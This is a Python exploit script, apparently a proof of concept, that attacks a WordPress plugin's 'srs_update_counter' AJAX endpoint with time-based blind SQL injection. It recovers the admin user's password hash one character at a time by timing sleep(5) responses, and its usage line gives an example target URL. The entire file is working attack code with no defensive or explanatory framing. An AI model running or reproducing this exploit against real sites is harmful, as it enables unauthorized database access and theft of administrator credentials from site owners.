import requests
import time
import sys

def findHash(targetUrl, length): 
  print ("Retrieving the Admin Hash: ", end='', flush=True)
  for i  in range (1, length):
    for j in [0] + list(range(32, 126)):
      url = "%s/wp-admin/admin-ajax.php?action=srs_update_counter&post_id=1+and+1=0)+union+select+(select+if(ascii(substring((select+user_pass+from+wp_users+where+user_login=char(97,100,109,105,110)),%d,1))=%d,sleep(5),sleep(0))),1,1,1,1,1;--" % (targetUrl, i, j)
      start = time.time()
      req = requests.get(url)
      delay = time.time() - start
      if delay >= 5:
        print(chr(j), end='', flush=True)
        break
    if j == 0:
        break

def main():
  if len(sys.argv) != 2:
    print (f"(+) usage: python3 {sys.argv[0]} <target>")
    print (f"(+) eg: python3 {sys.argv[0]} http://192.168.0.10/wordpress")
    sys.exit(-1)

  targetUrl = sys.argv[1]
  adminHash = findHash(targetUrl, 50)

if __name__ == "__main__": 
  main()
